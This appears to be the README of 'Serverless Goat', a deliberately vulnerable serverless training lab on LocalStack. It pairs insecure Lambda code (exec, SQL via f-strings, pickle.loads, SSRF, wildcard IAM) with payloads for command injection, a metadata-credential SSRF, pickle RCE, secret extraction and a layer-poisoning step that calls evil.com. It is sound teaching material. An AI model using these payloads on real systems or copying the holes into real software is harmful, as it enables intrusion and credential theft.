# Serverless Goat

## Overview
Serverless Goat is a vulnerable serverless application demonstrating common security issues in Function-as-a-Service (FaaS) and serverless architectures, using LocalStack to simulate AWS services.

## Quick Start

**LocalStack Dashboard**: http://localhost:4566

**Services Available**:
- Lambda Functions
- API Gateway
- DynamoDB
- S3
- SQS
- IAM

**AWS CLI Configuration**:
```bash
# Configure AWS CLI for LocalStack
export AWS_ACCESS_KEY_ID=test
export AWS_SECRET_ACCESS_KEY=test
export AWS_DEFAULT_REGION=us-east-1
export AWS_ENDPOINT_URL=http://localhost:4566
```

## Serverless Vulnerabilities

### 1. Function Event Injection
Manipulating Lambda event data:
```python
# Vulnerable Lambda function
def handler(event, context):
    # No input validation
    user_input = event['body']
    exec(user_input)  # Code injection!
    
# Attack
curl -X POST http://localhost:4566/restapis/api-id/prod/_user_request_/function \
  -d '{"body": "__import__(\"os\").system(\"cat /etc/passwd\")"}'
```

### 2. Privilege Escalation via IAM
Overly permissive function roles:
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "*",
    "Resource": "*"
  }]
}
```

Exploitation:
```python
# From within Lambda
import boto3
iam = boto3.client('iam', endpoint_url='http://localhost:4566')
# List all secrets
iam.list_users()
iam.list_roles()
```

### 3. Secrets in Environment Variables
```bash
# Deploy function with secrets
aws lambda create-function \
  --function-name vulnerable \
  --environment Variables={DB_PASSWORD=secret123,API_KEY=abc123} \
  --endpoint-url http://localhost:4566

# Extract from Lambda
aws lambda get-function-configuration \
  --function-name vulnerable \
  --endpoint-url http://localhost:4566
```

### 4. SQL Injection in Lambda
```python
def handler(event, context):
    user_id = event['userId']
    # Vulnerable query
    query = f"SELECT * FROM users WHERE id = {user_id}"
    
# Attack
{
  "userId": "1 OR 1=1 UNION SELECT * FROM credentials--"
}
```

### 5. Server-Side Request Forgery (SSRF)
```python
def handler(event, context):
    url = event['url']
    # No validation
    response = requests.get(url)
    
# Attack - Access metadata service
{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
```

### 6. Insecure Deserialization
```python
import pickle
def handler(event, context):
    # Deserialize user input
    data = pickle.loads(base64.b64decode(event['data']))
    
# Attack - Execute code via pickle
import pickle, base64, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('cat /tmp/* > /tmp/leak',))
        
payload = base64.b64encode(pickle.dumps(Exploit())).decode()
```

### 7. Function URL Misconfiguration
```bash
# Create publicly accessible function URL
aws lambda create-function-url-config \
  --function-name admin-function \
  --auth-type NONE \
  --endpoint-url http://localhost:4566

# Direct access without authentication
curl https://function-url.lambda-url.region.on.aws/
```

### 8. Cross-Function Access
```python
# Function A can invoke Function B
lambda_client = boto3.client('lambda')
response = lambda_client.invoke(
    FunctionName='admin-function',
    InvocationType='RequestResponse',
    Payload='{"action": "deleteAll"}'
)
```

### 9. Denial of Service
```python
def handler(event, context):
    # No timeout or resource limits
    size = int(event['size'])
    data = 'A' * size * 1024 * 1024  # Memory exhaustion
    
    # Or infinite loop
    while True:
        pass
```

### 10. Log Injection
```python
def handler(event, context):
    username = event['username']
    # Log injection
    print(f"Login attempt for user: {username}")
    
# Attack
{
  "username": "admin\nERROR: Authentication bypass successful\nINFO: User: attacker"
}
```

## Exploitation Techniques

### Lambda Layer Poisoning
```bash
# Create malicious layer
mkdir -p python/lib/python3.9/site-packages
echo "import os; os.system('curl evil.com/pwned')" > python/lib/python3.9/site-packages/requests.py
zip -r malicious-layer.zip python

# Upload layer
aws lambda publish-layer-version \
  --layer-name malicious-requests \
  --zip-file fileb://malicious-layer.zip \
  --endpoint-url http://localhost:4566
```

### Container Escape in Lambda
```python
# Check container info
def handler(event, context):
    import subprocess
    
    # Get container ID
    with open('/proc/self/cgroup', 'r') as f:
        print(f.read())
    
    # Try to access host
    result = subprocess.run(['cat', '/host/etc/passwd'], capture_output=True)
    return result.stdout.decode()
```

### API Gateway Bypass
```bash
# Direct Lambda invocation bypassing API Gateway auth
aws lambda invoke \
  --function-name protected-function \
  --payload '{"admin": true}' \
  response.json \
  --endpoint-url http://localhost:4566
```

## Common Misconfigurations

1. **Overly Permissive IAM Roles**
   - `*` actions and resources
   - Cross-service permissions

2. **Secrets Management**
   - Hardcoded credentials
   - Secrets in environment variables
   - Unencrypted in S3/DynamoDB

3. **No Input Validation**
   - Command injection
   - SQL/NoSQL injection
   - Path traversal

4. **Logging Issues**
   - Sensitive data in logs
   - No log monitoring
   - Log injection

5. **Network Security**
   - Public function URLs
   - No VPC isolation
   - Open security groups

## Testing Commands

### LocalStack AWS CLI
```bash
# List functions
aws lambda list-functions --endpoint-url http://localhost:4566

# Get function code
aws lambda get-function --function-name vuln-func \
  --endpoint-url http://localhost:4566

# List S3 buckets
aws s3 ls --endpoint-url http://localhost:4566

# Get DynamoDB tables
aws dynamodb list-tables --endpoint-url http://localhost:4566
```

### Attack Scenarios
```bash
# 1. Extract all environment variables
aws lambda list-functions --endpoint-url http://localhost:4566 \
  --query 'Functions[*].[FunctionName,Environment.Variables]'

# 2. Download function code
aws lambda get-function --function-name target \
  --endpoint-url http://localhost:4566 \
  --query 'Code.Location' | xargs curl -o function.zip

# 3. Invoke with malicious payload
aws lambda invoke --function-name vulnerable \
  --payload '{"cmd":"cat /var/runtime/bootstrap"}' \
  --endpoint-url http://localhost:4566 \
  response.json
```

## Defense Mechanisms (What's Missing)
- ❌ Input validation
- ❌ Least privilege IAM
- ❌ Secrets manager usage
- ❌ VPC isolation
- ❌ Function URLs authentication
- ❌ Runtime protection
- ❌ Code signing
- ❌ Monitoring and alerting

## Learning Objectives
- Understanding serverless attack surface
- Function injection techniques
- IAM privilege escalation
- Serverless security best practices
- Container security in FaaS

## Additional Resources
- [OWASP Serverless Top 10](https://owasp.org/www-project-serverless-top-10/)
- [AWS Lambda Security Best Practices](https://docs.aws.amazon.com/lambda/latest/dg/lambda-security.html)
- [Serverless Security Guide](https://www.puresec.io/hubfs/SAS-Top10-2018/PureSec-Top-10-Serverless-Security-Risks-Guide.pdf)
- [LocalStack Documentation](https://docs.localstack.cloud/) 